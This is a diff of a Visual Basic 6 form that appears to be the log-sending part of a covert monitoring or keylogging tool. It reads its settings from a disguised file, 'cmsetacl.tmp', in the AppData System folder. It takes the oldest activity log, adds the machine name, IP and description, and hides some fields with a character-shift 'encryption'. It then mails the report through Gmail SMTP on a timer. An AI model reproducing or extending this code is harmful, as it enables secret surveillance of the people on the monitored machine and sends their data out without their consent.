@@ -66,18 +66,18 @@ Attribute VB_PredeclaredId = True
 Attribute VB_Exposed = False
 'Option Explicit
 
-'username import function
-Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
+'Special Folde Path
+Public Enum mceIDLPaths
+    CSIDL_APPDATA = &H1A 'C:\WINNT\Profiles\username\Application Data.
+End Enum
+Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hWnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
+
 Public Lpath, sendTo, sendFrom, FromPWD, FromPC As String
-
-
-
 
 
 Private Sub Form_Load()
 Me.Left = Screen.Width - Me.Width
 Me.Top = Screen.Height - Me.Height
-LoadUserName
 LoadSetting
 End Sub
 Private Sub LoadSetting()
@@ -85,12 +85,16 @@ Private Sub LoadSetting()
 Lpath = ""
 Dim RetryTime, LogPWD As String
 
-If Dir("C:\Documents and Settings\" & txtUserName & "\Application Data\System\STP.txt") <> "" Then 'setting file found then
+If Dir(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp") <> "" Then 'setting file found then
     
-    Open "C:\Documents and Settings\" & txtUserName & "\Application Data\System\STP.txt" For Input As 1
+    Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp") For Input As 1
     Input #1, Lpath, LogPWD, FromPC, sendTo, sendFrom, FromPWD, RetryTime
     Close #1
     
+If LCase(sendTo) = "none" Then End
+
+If Left(Lpath, 2) = "u:" Then Lpath = Environ$("USERPROFILE") & Mid(Lpath, 3, Len(Lpath) - 2)
+
 File1.Path = Lpath  'here Lpath=LogDirectory path
 Timer1.Interval = 1000 * RetryTime
 LoadLogtoSend   'Move to Log sending process
@@ -110,20 +114,19 @@ File1.ListIndex = 0 'Choose first log which will be oldest
 
 Lpath = File1.Path & "\" & File1.FileName
 
-Dim NoNeed, lTime, lDate, UName, lPwd, AppRevision As String
+Dim NoNeed, lTime, lDate, CompDesc, lPwd, AppRevision As String
 
 'Read initials
 Open Lpath For Input As 1
-Input #1, NoNeed, lTime, lDate, UName, lPwd, AppRevision
+Input #1, NoNeed, lTime, lDate, CompDesc, lPwd, AppRevision
 Close #1
 
-txtSendThis = "Machine Name: " & Winsock1.LocalHostName & vbNewLine
-txtSendThis = txtSendThis & "Machine Description: " & FromPC & vbNewLine
+txtSendThis = "Machine Description: " & Encrypt(CompDesc, -25) & vbNewLine
+txtSendThis = txtSendThis & "Machine Name: " & Winsock1.LocalHostName & vbNewLine
 txtSendThis = txtSendThis & "Machine IP: " & Winsock1.LocalIP & vbNewLine
 txtSendThis = txtSendThis & "Date: " & lDate & vbNewLine
 txtSendThis = txtSendThis & "Start Time: " & lTime & vbNewLine
 txtSendThis = txtSendThis & "End Time: " & FileDateTime(Lpath) & vbNewLine
-txtSendThis = txtSendThis & "User: " & Encrypt(UName, -25) & vbNewLine
 txtSendThis = txtSendThis & "AppVersion: " & Encrypt(AppRevision, -20) & vbNewLine
 
 If lPwd <> "" Then  'Skip the Read Log Stage, Log is password protected.
@@ -208,10 +211,10 @@ End Sub
 Sub SendEmail2()
 
 On Error GoTo Err2
-Dim schema As String
-Open App.Path & "\testEmail.txt" For Append As #1
+'Dim schema As String
+Open App.Path & "\testEmail.txt" For Output As #1
 ' send one copy with Google SMTP server (with autentication)
-schema = "http://schemas.microsoft.com/cdo/configuration/"
+'schema = "http://schemas.microsoft.com/cdo/configuration/"
 Print #1, 2
 Print #1, "smtp.gmail.com"
 Print #1, 465
@@ -251,26 +254,23 @@ Private Sub Timer1_Timer()
 lblSec.Caption = lblSec.Caption + 1
 If lblSec.Caption = 60 Then lblSec.Caption = 0: Call SendEmail
 End Sub
-Private Sub LoadUserName()
 
-'IMPORT USERNAME*******************************************
-Dim sBuffer As String
-    Dim lSize As Long
-    sBuffer = Space$(255)
-    lSize = Len(sBuffer)
-    Call GetUserName(sBuffer, lSize)
-    If lSize > 0 Then
-        txtUserName = Left$(sBuffer, lSize)
-    Else
-        txtUserName = vbNullString
-End If
-
-End Sub
 Private Function Encrypt(ByVal ThisText As String, encCode As Integer) As String
 Dim i As Integer
 For i = 1 To Len(ThisText)
 Encrypt = Encrypt & Chr(Asc(Mid(ThisText, i, 1)) + encCode)
 Next i
 End Function
+Public Function GetSpecialFolderA(ByVal eSpecialFolder As mceIDLPaths) As String
 
+Dim Ret As Long
+Dim Trash As String: Trash = Space$(260)
+
+    Ret = SHGetSpecialFolderPath(0, Trash, eSpecialFolder, False)
+    If Trim$(Trash) <> Chr(0) Then Trash = Left$(Trash, InStr(Trash, Chr(0)) - 1) & "\"
+     
+    GetSpecialFolderA = Trash
+    
+
+End Function
 
